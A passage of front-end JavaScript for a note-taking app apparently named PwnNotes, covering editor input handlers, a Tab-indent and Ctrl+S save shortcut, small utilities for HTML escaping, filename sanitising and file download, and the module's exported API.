        const tagsInput = document.getElementById('noteTagsInput');
        const contentTextarea = document.getElementById('noteContentTextarea');

        if (titleInput) titleInput.addEventListener('input', (e) => updateNoteField('title', e.target.value));
        if (catSelect) catSelect.addEventListener('change', (e) => updateNoteField('category', e.target.value));
        if (tagsInput) tagsInput.addEventListener('input', (e) => updateNoteField('tags', e.target.value));

        if (contentTextarea) {
            contentTextarea.addEventListener('input', (e) => updateNoteField('content', e.target.value));
            
            // Tab key support: insert 4 spaces without losing focus
            contentTextarea.addEventListener('keydown', (e) => {
                if (e.key === 'Tab') {
                    e.preventDefault();
                    const start = contentTextarea.selectionStart;
                    const end = contentTextarea.selectionEnd;
                    const val = contentTextarea.value;
                    contentTextarea.value = val.substring(0, start) + '    ' + val.substring(end);
                    contentTextarea.selectionStart = contentTextarea.selectionEnd = start + 4;
                    updateNoteField('content', contentTextarea.value);
                }
            });
        }

        // Global shortcuts (Ctrl+S to save)
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'S')) {
                e.preventDefault();
                manualSave();
            }
        });
    }

    // ── 11. UTILITIES ──
    function escapeHtml(str) {
        if (!str) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    function capitalize(str) {
        if (!str) return '';
        return str.charAt(0).toUpperCase() + str.slice(1);
    }

    function sanitizeFilename(name) {
        return name.replace(/[^a-z0-9_-]/gi, '_').toLowerCase();
    }

    function downloadBlob(content, filename, mimeType) {
        const blob = new Blob([content], { type: mimeType });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // ── 12. EXPORT PUBLIC API ──
    window.PwnNotes = {
        createNewNote,
        deleteActiveNote,
        duplicateActiveNote,
        togglePinActiveNote,
        manualSave,
        toggleViewMode,
        insertCodeBlockAtCursor,
        insertMarkdownSnippet,
        copyDirectCode,
        exportActiveMarkdown,
        exportAllNotesBackup,
        importNotesTrigger,
        handleImportFile
    };

})();
